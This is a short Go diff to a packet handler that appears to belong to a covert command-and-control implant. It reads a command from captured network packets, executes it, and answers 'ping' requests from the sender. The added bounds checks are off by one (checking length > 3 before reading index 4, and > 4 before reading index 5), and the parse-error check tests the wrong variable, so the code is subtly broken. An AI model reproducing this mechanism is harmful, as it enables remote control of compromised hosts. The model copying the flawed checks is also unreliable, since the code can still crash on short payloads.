@@ -508,21 +508,26 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		return
 	}
 
-	cmd := payload[4]
-	execCommand(cmd)
+	//Parse commands to run
+	if len(payload) > 3 {
+		cmd := payload[4]
+		execCommand(cmd)
+	}
 
 	//get ping command
-	ping := payload[5]
-	if ping != "" {
-		iface, src := GetOutwardIface("8.8.8.8:80")
-		srcMAC, err2 := net.ParseMAC(packet.NetworkLayer().NetworkFlow().Src().String())
-		if err != nil {
-			if debugCheck != "" { fmt.Println("[-] ERROR PARSING IP:", err2) }
-			return
-		}
-		srcIP := net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String())
+	if len(payload) > 4 {
+		ping := payload[5]
+		if ping != "" {
+			iface, src := GetOutwardIface("8.8.8.8:80")
+			srcMAC, err2 := net.ParseMAC(packet.NetworkLayer().NetworkFlow().Src().String())
+			if err != nil {
+				if debugCheck != "" { fmt.Println("[-] ERROR PARSING IP:", err2) }
+				return
+			}
+			srcIP := net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String())
 
-		go sendHello(iface, src, srcIP, srcMAC)
+			go sendHello(iface, src, srcIP, srcMAC)
+		}
 	}
 	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
 	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())
